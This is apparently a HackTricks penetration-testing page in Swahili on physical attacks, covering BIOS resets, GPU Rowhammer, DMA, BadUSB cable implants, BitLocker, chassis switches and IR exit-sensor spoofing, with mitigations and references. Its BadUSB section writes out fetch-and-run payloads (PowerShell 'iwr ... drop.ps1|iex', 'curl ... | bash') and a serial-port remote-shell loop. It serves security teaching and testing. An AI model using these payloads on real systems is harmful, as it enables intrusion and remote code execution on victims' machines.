# Mashambulizi ya Kimwili

{{#include ../banners/hacktricks-training.md}}

## Urejeshaji wa Nenosiri la BIOS na Usalama wa Mfumo

Mipangilio ya firmware ya PC za zamani inaweza kuwekwa upya kwa kukata betri ya CMOS au kutumia jumper ya clear-CMOS iliyoelezwa kwenye nyaraka. Muda unaohitajika wa kuzima umeme hutegemea board, na nenosiri au funguo za kisasa za UEFI zinaweza kuhifadhiwa kwenye flash isiyopoteza data, embedded controller, au kifaa cha usalama, hivyo zikaendelea kuwepo baada ya kuondoa betri. Kagua mwongozo wa board/service kabla ya kuunganisha pini kwa muda mfupi; utaratibu huu unaweza pia kubatilisha vipimo vya TPM na kuanzisha urejeshaji wa usimbaji wa diski.

Kwenye mifumo ya zamani ya x86, tools kama **killCMOS** na **CmosPwd** zinaweza kukagua au kubadilisha mipangilio inayohifadhiwa na CMOS kutoka kwenye mazingira ya bootable. CmosPwd hutambua miundo ya manenosiri kutoka kwenye orodha iliyoandikwa ya familia za zamani za BIOS na inaweza kufanya backup, restore, au erase/kill hali ya CMOS; builds zake zilizochapishwa zinalenga mazingira ya zamani ya DOS/Windows, Linux, FreeBSD, na NetBSD.<sup>[[18]](#references)</sup> Utilities hizi si zana za jumla za kuondoa manenosiri ya UEFI na zinahitaji ufikiaji wa kutosha wa hardware/firmware.

Baadhi ya firmware za laptop huonyesha msimbo wa challenge maalum wa vendor baada ya majaribio kadhaa yaliyoshindikana ya kuingiza nenosiri. Databases kama [bios-pw.org](https://bios-pw.org) zinaweza kutengeneza manenosiri ya urejeshaji ya vendor wa zamani kwa baadhi ya modeli, lakini mifumo mingi hutumia lockout bila challenge inayoweza kutolewa. Chukulia nenosiri lolote lililotengenezwa kuwa maalum kwa modeli husika na epuka kumaliza counters za majaribio za kudumu.

### Usalama wa UEFI

Kwa mifumo ya kisasa ya **UEFI**, CHIPSEC inaweza kukagua ulinzi wa variables za Secure Boot. Anza na ukaguzi usiobadilisha chochote ulio hapa chini; hali ya hiari ya `-a modify` hujaribu kwa makusudi kuharibu variables na inapaswa kutumiwa tu kwenye mfumo wa maabara unaoweza kurejeshwa. CHIPSEC yenyewe inaonya kwamba driver yake yenye privileged access na ufikiaji wa hardware wa kiwango cha chini havifai kwa endpoints za production.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Uchambuzi wa RAM na Cold Boot Attacks

DRAM haipotezi kila bit mara moja baada ya refresh kusimama. Kiwango cha kuoza hutofautiana kwa kiasi kikubwa kulingana na teknolojia ya module na halijoto; kupooza kunaweza kuhifadhi data muhimu kwa muda mrefu zaidi kuliko power cycle isiyopoozwa. Cold-boot attack huwasha upya mfumo haraka katika mazingira madogo ya acquisition au huhamisha module iliyopozwa, kunasa memory ghafi, na kujenga upya funguo za cryptographic licha ya kuoza kwa bits. Disk-copy utility si lazima iwe physical-memory imager, na Volatility huchanganua capture badala ya kuipata; tumia acquisition tool inayofaa kwa platform na iliyothibitishwa.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer huwa muhimu zaidi yanapolenga **GPU virtual-memory metadata** badala ya buffers za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kwamba attacker anayeendesha CUDA code bila privileged access anaweza kuunda hammering patterns maalum kwa GPU, kutumia **memory massaging** kuweka paging structures katika rows zilizo hatarini, kisha kugeuza bits katika **last-level page table** au **page directory** ya kati. Entry moja ya translation inapoharibika, attacker anaweza kuanzisha **arbitrary GPU memory read/write** na kisha kupivot kwenda kwenye compromise ya host.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** katika GDDR6 na uunde hammering patterns zinazotambua refresh / zisizo za uniform ambazo hupita mitigations za ndani ya DRAM.
2. **Massage GPU allocations** ili driver iweke page-translation structures katika maeneo ya kimwili yanayoweza kuhammeriwa badala ya kuyaweka katika default protected pool. Kwa vitendo, hii inaweza kumaanisha kumaliza low-memory page-table region na kusambaza UVM mappings kubwa na sparse zenye strides zinazodhibitiwa.
3. **Flip translation metadata** kama **PFN** au bits zinazohusiana na aperture ndani ya page-table / page-directory entry ili ukurasa wa virtual unaodhibitiwa na attacker uelekee kwenye page-table pages, arbitrary GPU memory, au system mappings zinazoonekana na host.
4. Tumia upya forged mapping kuandika translation entries za ziada na kupanua uwezo hadi **arbitrary GPU memory read/write** katika GPU contexts mbalimbali.

### Host Pivot na Mitigations

- **IOMMU ikiwa imezimwa**, forged system-aperture mappings zinaweza kufichua **host physical memory** yoyote kwa GPU, na kugeuza GPU primitive kuwa compromise kamili ya host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** inalenga last-level page-table entries, huku **GeForge** ikionyesha kwamba kuharibu kiwango cha page-directory kunaweza kuwa rahisi zaidi kwa sababu bit flip moja inaweza kuelekeza upya translation subtree kubwa. Usichukulie paging layer moja tu kuwa ndiyo muhimu kwa usalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia njia ya moja kwa moja ya arbitrary-host-memory inayotumiwa na GDDRHammer/GeForge, lakini **si mitigation kamili**. **GPUBreach** inaonyesha pivot ya hatua ya pili ambapo attacker huharibu CPU buffers zinazoweza kuandikwa na GPU na zinazomilikiwa na driver, kisha huanzisha memory-safety bugs za NVIDIA driver ili kupata kernel write primitive na **root shell** hata IOMMU ikiwa imewezeshwa.<sup>[[3]](#references)</sup>
- **System-level ECC** ni hatua ya practical hardening kwenye workstation/server GPUs zinazoungwa mkono. Consumer GPUs zisizo na ECC zina defense surface dhaifu zaidi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia pekee: **GeForge** iliripoti **1,171** bit flips kwenye RTX 3060 na **202** kwenye RTX A6000, ambazo zilitosha kujenga host-privilege-escalation chain inayofanya kazi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Mashambulizi ya Direct Memory Access (DMA)

**Inception** inaonyesha **DMA-based memory acquisition and patching** kupitia interfaces kama FireWire na configurations za awali za Thunderbolt, pamoja na login-bypass signatures za kihistoria. Si sahihi kusema tu kwamba haina ufanisi dhidi ya Windows 10: exploitability hutegemea interface, target build, IOMMU policy, lock state, na kama Windows Kernel DMA Protection inaungwa mkono na imewezeshwa. Windows 10 version 1803 na matoleo ya baadaye yalianzisha Kernel DMA Protection kwenye platforms zinazooana, na kubadilisha kwa kiasi kikubwa attack surface.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB kwa System Access

Kwenye Windows volume ambayo haijasimbwa au ambayo tayari imefunguliwa, offline environment inaweza kubadilisha accessibility binaries kama **sethc.exe** au **Utilman.exe** na **cmd.exe**, na hivyo kutoa SYSTEM command prompt shortcut inayolingana ya logon screen inapoendeshwa. Tools kama **chntpw** zinaweza kuhariri local SAM account data. Mbinu hizi hazipiti BitLocker volume iliyofungwa na zinaweza kuharibu credentials zinazolindwa na DPAPI/EFS; hifadhi forensic copies na backups.

**Kon-Boot** ni commercial boot-time authentication-bypass tool kwa Windows/macOS configurations zinazoungwa mkono. Compatibility hutegemea OS, firmware mode, Secure Boot, na disk-encryption setup; haifanyi decryption ya BitLocker volume iliyofungwa.<sup>[[10]](#references)</sup>

---

## Kushughulikia Windows Security Features

### Boot na Recovery Shortcuts

- **Delete/Supr**, F2, F10, au vendor key nyingine inaweza kufungua firmware setup.
- **F8** huingia katika legacy Windows advanced boot options tu kwenye configurations ambazo njia hiyo bado imewezeshwa; recovery entry ya sasa hutofautiana.
- Kushikilia **Shift** kunaweza kuzuia Windows automatic logon katika baadhi ya configurations, ingawa policy/registry settings zinaweza kuzima tabia hiyo.<sup>[[17]](#references)</sup>

### BAD USB Devices

Devices kama **USB Rubber Ducky** na Teensy boards zinaweza kujitambulisha kama trusted HID keyboards na kuingiza keystrokes zilizoainishwa awali. Payload mwanzoni huwa na privileges na desktop access za logged-on session; UAC prompts, screen locking, keyboard layout, timing, na endpoint USB policy bado huiwekea mipaka.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator au backup privileges zinaweza kuunda shadow copy au kuhifadhi registry hives ili files zilizofungwa kama **SAM** na **SYSTEM** ziweze kupatikana. Hii ni post-compromise collection technique, si privilege bypass, na inapaswa kuhusishwa na matukio ya `diskshadow`/VSS na registry-hive export.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants kama **Evil Crow Cable Wind** hujificha ndani ya nyaya za USB-A→USB-C au USB-C↔USB-C, hujitambulisha kikamilifu kama USB keyboard, na hutoa C2 stack yake kupitia Wi-Fi. Operator anahitaji tu kuipa cable nguvu kutoka kwa victim host, kuunda hotspot yenye jina `Evil Crow Cable Wind` na password `123456789`, kisha kuvinjari [http://cable-wind.local/](http://cable-wind.local/) (au DHCP address yake) ili kufikia embedded HTTP interface.<sup>[[8]](#references)</sup>
- Browser UI hutoa tabs za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, na *Config*. Payloads zilizohifadhiwa huwekewa tag kulingana na OS, keyboard layouts hubadilishwa on the fly, na VID/PID strings zinaweza kubadilishwa ili kuiga peripherals zinazojulikana.
- Kwa kuwa C2 iko ndani ya cable, simu inaweza kuandaa payloads, kuanzisha execution, na kudhibiti Wi-Fi credentials bila kutumia network ya shirika—jambo linalofaa kwa physical intrusions zenye dwell-time fupi.

### OS-aware AutoExec payloads

- AutoExec rules hufunga payloads moja au zaidi ili zitekelezwe mara moja baada ya USB enumeration. Implant hufanya OS fingerprinting nyepesi na kuchagua script inayolingana.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa sababu execution haijahitaji usimamizi wa moja kwa moja, kubadilisha charging cable pekee kunaweza kufanikisha initial access ya “plug-and-pwn” chini ya logged-on user context.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Payload iliyohifadhiwa hufungua console na kubandika loop inayotekeleza chochote kinachofika kwenye USB serial device mpya. Windows variant ndogo ni:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant huweka channel ya USB CDC wazi huku ESP32-S3 yake ikianzisha TCP client (Python script, Android APK, au desktop executable) kuelekea operator. Byte zozote zinazoandikwa kwenye TCP session hupitishwa kwenye serial loop iliyo hapo juu, hivyo kutoa remote command execution hata kwenye hosts zilizotengwa na mtandao. Output ni chache, kwa hiyo operators kwa kawaida huendesha blind commands (kuunda akaunti, kuandaa tooling ya ziada, n.k.).

### HTTP OTA update surface

- Interface ya Evil Crow Cable Wind iliyoandikwa kwenye documentation inafichua firmware-update endpoint isiyohitaji authentication kwenye `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Waendeshaji wa field wanaweza kubadilisha features kwa hot-swap (kwa mfano, ku-flash firmware ya USB Army Knife) katikati ya engagement bila kufungua cable, hivyo kuruhusu implant kubadili kwenda kwenye capabilities mpya ikiwa bado imechomekwa kwenye host inayolengwa.

## Kukwepa Usimbaji Fiche wa BitLocker

Uchukuaji wa ki-forensic ulioidhinishwa wa mfumo unaofanya kazi au uliokuwa ukifanya kazi hivi karibuni unaweza kuwa na volume master key ya BitLocker au key material inayohusiana nayo wakati volume ikiwa unlocked. Zana za kibiashara kama Elcomsoft Forensic Disk Decryptor na Passware Kit Forensic zinaweza kutafuta memory images, hibernation files, au crash dumps zinazoungwa mkono, lakini mafanikio hayahakikishwi. Windows za kisasa pia husimba crash dumps kwa njia fiche wakati BitLocker imewezeshwa, na recovery password iliyohifadhiwa yenye tarakimu 48 ni artifact tofauti na volume key iliyo kwenye memory.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering kwa Kuongeza Recovery Key

Attacker anayemshawishi administrator kuendesha BitLocker-management commands anaweza kuongeza recovery-password, external-key, au protector mwingine kisha kuikamata. Recovery password haiwezi kuwa string ya zero kiholela: recovery passwords za BitLocker zenye tarakimu zina format ya tarakimu 48 iliyothibitishwa. Syntax husika ya authorized-administration ni `manage-bde -protectors -add C: -recoverypassword`; orodhesha protectors zitakazotokana na hilo kwa `manage-bde -protectors -get C:`. Fuatilia nyongeza za protectors na uhakikishe kuwa recovery material mpya inahifadhiwa kwa escrow katika locations zilizoidhinishwa pekee.<sup>[[16]](#references)</sup>

---

## Kutumia Chassis Intrusion / Maintenance Switches Kuweka BIOS kwenye Factory Reset

Laptops nyingi za kisasa na desktops za small-form-factor zina **chassis-intrusion switch** inayofuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Ingawa madhumuni ya msingi ya switch ni kutoa alert kifaa kinapofunguliwa, vendors wakati mwingine hutekeleza **undocumented recovery shortcut** inayowashwa switch inapobadilishwa kwa pattern maalum.<sup>[[5]](#references)[[6]](#references)</sup>

### Jinsi Attack Inavyofanya Kazi

1. Switch imeunganishwa kwenye **GPIO interrupt** ya EC.
2. Firmware inayotumika kwenye EC hufuatilia **timing na idadi ya mibofyo**.
3. Pattern iliyowekwa moja kwa moja inapotambuliwa, EC huita routine ya *mainboard-reset* ambayo **hufuta contents za system NVRAM/CMOS**.
4. Kwenye boot inayofuata, modeli zilizoathiriwa hupakia firmware state iliyowekwa upya. Kulingana na vendor na revision, state iliyofutwa inaweza kujumuisha supervisor password, custom boot settings, au Secure Boot keys zilizo-enrolliwa; hali ya TPM na athari za disk-encryption lazima zitathminiwe kando.

> Firmware reset inaweza kurejesha external-boot options, lakini **haisimbui storage kuwa wazi**. BitLocker au full-disk encryption system nyingine inaweza kuingia recovery baada ya mabadiliko ya TPM/firmware na bado kulinda drive ya ndani bila recovery key.<sup>[[16]](#references)</sup>

### Mfano wa Ulimwengu Halisi – Framework 13 Laptop

Recovery shortcut ya Framework 13 (11th/12th/13th-gen) ni:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Baada ya mzunguko wa kumi, EC huweka flag inayoielekeza BIOS kufuta NVRAM wakati wa kuwasha upya kunakofuata. Utaratibu mzima huchukua takriban sekunde 40 na hauhitaji **chochote isipokuwa bisibisi**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa au kifanye suspend-resume ili EC iwe inaendesha.
2. Ondoa kifuniko cha chini ili kufichua swichi ya intrusion/maintenance.
3. Rudia mpangilio wa toggle unaotegemea vendor (wasiliana na documentation, forums, au reverse-engineer firmware ya EC).
4. Kikusanye tena na ukiwashe upya, kisha kagua ni mipangilio ipi ya firmware na credentials zilizobadilika kwa hakika.
5. Ikiwa umeidhinishwa na external boot inapatikana, washa live image inayodhibitiwa. Mara tu volume ya ndani inapokuwa imefunguliwa kihalali (au ikiwa haikuwahi ku-encryptiwa), live environment inaweza kupata credentials na data au kukagua EFI System Partition. Kubadilisha partition hiyo ili kusakinisha EFI implant ni persistent na intrusive sana, na bado kunadhibitiwa na Secure Boot, measured boot, firmware write protection, na endpoint monitoring. Encrypted storage hubaki bila kufikika bila key yake au recovery material.

### Detection & Mitigation

* Weka kumbukumbu za matukio ya chassis-intrusion katika OS management console na uyalinganishe na BIOS resets zisizotarajiwa.
* Tumia **tamper-evident seals** kwenye screws/covers ili kugundua kufunguliwa.
* Weka vifaa katika **maeneo yanayodhibitiwa kimwili**; chukulia kwamba physical access ni sawa na full compromise.
* Pale inapopatikana, zima kipengele cha vendor cha “maintenance switch reset” au hitaji cryptographic authorisation ya ziada kwa NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Sensors za kawaida za “wave-to-exit” huunganisha near-IR LED emitter na TV-remote style receiver module ambayo huripoti logic high tu baada ya kuona pulses nyingi (~4–10) za carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastic shroud huzuia emitter na receiver kutazamana moja kwa moja, hivyo controller hudhani kwamba carrier yoyote iliyothibitishwa imetoka kwenye reflection iliyo karibu na huendesha relay inayofungua door strike.
- Controller inapoamini kwamba target ipo, mara nyingi hubadilisha outbound modulation envelope, lakini receiver huendelea kukubali burst yoyote inayolingana na carrier iliyochujwa.

### Attack Workflow
1. **Capture the emission profile** – unganisha logic analyser kwenye controller pins ili kurekodi pre-detection na post-detection waveforms zinazoendesha internal IR LED.
2. **Replay only the “post-detection” waveform** – ondoa/puuza stock emitter na uendeshe external IR LED kwa pattern ambayo tayari imetriggeriwa tangu mwanzo. Kwa kuwa receiver inajali tu pulse count/frequency, huchukulia carrier iliyospoofiwa kama reflection halisi na huweka relay line katika hali ya active.
3. **Gate the transmission** – tuma carrier katika bursts zilizowekwa kwa timing maalum (kwa mfano, makumi ya milliseconds ikiwa imewashwa na muda unaofanana ikiwa imezimwa) ili kutoa pulse count ya chini kabisa bila ku-saturate AGC ya receiver au interference handling logic. Emission endelevu hupunguza sensitivity ya sensor haraka na kuzuia relay ku-trigger.

### Long-Range Reflective Injection
- Kubadilisha bench LED na high-power IR diode, MOSFET driver, na focusing optics huwezesha triggering ya kuaminika kutoka umbali wa takriban mita 6.
- Attacker hahitaji line-of-sight kwa receiver aperture; kuelekeza beam kwenye interior walls, shelving, au door frames zinazoonekana kupitia kioo huruhusu reflected energy kuingia kwenye field of view ya takriban 30° na kuiga hand wave ya masafa mafupi.
- Kwa kuwa receivers hutazamia reflections dhaifu pekee, external beam yenye nguvu zaidi inaweza kuruka kwenye surfaces nyingi na bado ibaki juu ya detection threshold.

### Weaponised Attack Torch
- Kuweka driver ndani ya commercial flashlight huficha tool waziwazi. Badilisha visible LED na high-power IR LED inayolingana na band ya receiver, ongeza ATtiny412 (au inayofanana) ili kuzalisha bursts za ≈30 kHz, na utumie MOSFET ku-sink LED current.
- Telescopic zoom lens hukaza beam kwa ajili ya range/precision, huku vibration motor iliyo chini ya udhibiti wa MCU ikitoa haptic confirmation kwamba modulation inafanya kazi bila kutoa visible light.
- Kupitia modulation patterns kadhaa zilizohifadhiwa (carrier frequencies na envelopes zinazotofautiana kidogo) huongeza compatibility kati ya sensor families zilizopewa brand upya, na kumwezesha operator kuscan reflective surfaces hadi relay isikike ikibofya na mlango uachilie.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Bonyeza hapa ili upwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mwongozo wa Mainboard Reset](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Kupita Bypassing IR No-Touch Exit Sensors kwa Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking kwa Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
